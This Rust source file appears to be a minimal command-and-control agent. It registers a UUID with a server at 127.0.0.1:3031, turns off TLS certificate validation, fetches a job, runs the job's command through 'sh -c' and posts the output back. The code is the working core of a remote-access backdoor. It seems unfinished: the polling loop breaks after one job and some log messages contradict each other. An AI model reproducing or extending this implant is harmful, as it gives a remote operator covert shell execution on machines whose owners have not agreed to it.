use reqwest::{Client, Error};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::fs::File;
use std::io::{prelude::*, Read};
use std::process::Command;
use uuid::Uuid;

#[derive(Debug, Deserialize)]
struct Job {
    agent_uuid: String,
    command: String,
}

#[derive(Debug, Serialize)]
struct JobOutput {
    agent_uuid: String,
    output: String,
}

fn run_command(job: Job) -> String {
    let output = Command::new("sh").arg("-c").arg(job.command).output();

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();

            if !output.status.success() {
                format!(
                    "Command failed with status: {}\nStderr: {}",
                    output.status, stderr
                )
            } else {
                stdout
            }
        }
        Err(e) => format!("Error executing command: {}", e),
    }
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .use_rustls_tls()
        .build()?;

    let file_path = "agent_id";
    let mut uuid = String::new();

    match File::open(file_path) {
        Ok(mut file) => {
            println!("File already exists. Overwriting its contents.");
            println!("File exists. Reading its contents.");
            match file.read_to_string(&mut uuid) {
                Ok(_) => {
                    println!("Successfully read the file contents.");
                    println!("UUID string: {}", uuid);
                }
                Err(e) => {
                    println!("Failed to read the file: {}", e);
                }
            }
        }
        // Create the file and write the agent uuid to it
        Err(_) => {
            println!("File does not exist. Creating a new file.");
            uuid = Uuid::new_v4().to_string();
            println!("agent uuid: {}", uuid);
            match File::create(file_path) {
                Ok(mut file) => match file.write_all(uuid.as_bytes()) {
                    Ok(_) => println!("Successfully wrote to the file."),
                    Err(e) => println!("Failed to write to the file: {}", e),
                },
                Err(e) => {
                    println!("Failed to create file: {}", e);
                }
            }
        }
    }

    let body = json!({"uuid": uuid});
    let register_agent_status = client
        .post("https://127.0.0.1:3031/register_agent")
        .json(&body)
        .send()
        .await?
        .text()
        .await?;

    println!("text: {register_agent_status:?}");

    // Start infinite loop, query for jobs
    loop {
        let cmd_to_run = client
            .get("https://127.0.0.1:3031/list_jobs")
            .send()
            .await?
            .text()
            .await?;
        let job: Job = serde_json::from_str(&cmd_to_run).unwrap();
        //println!("{:?}", job);
        let output = run_command(job);
        println!("{}", output);
        let job_output = JobOutput {
            agent_uuid: uuid,
            output: output,
        };
        let send_output_status = client
            .post("https://127.0.0.1:3031/job_output")
            .json(&job_output)
            .send()
            .await?
            .text()
            .await?;
        println!("Send output status: {}", send_output_status);
        break;
    }

    Ok(())
}
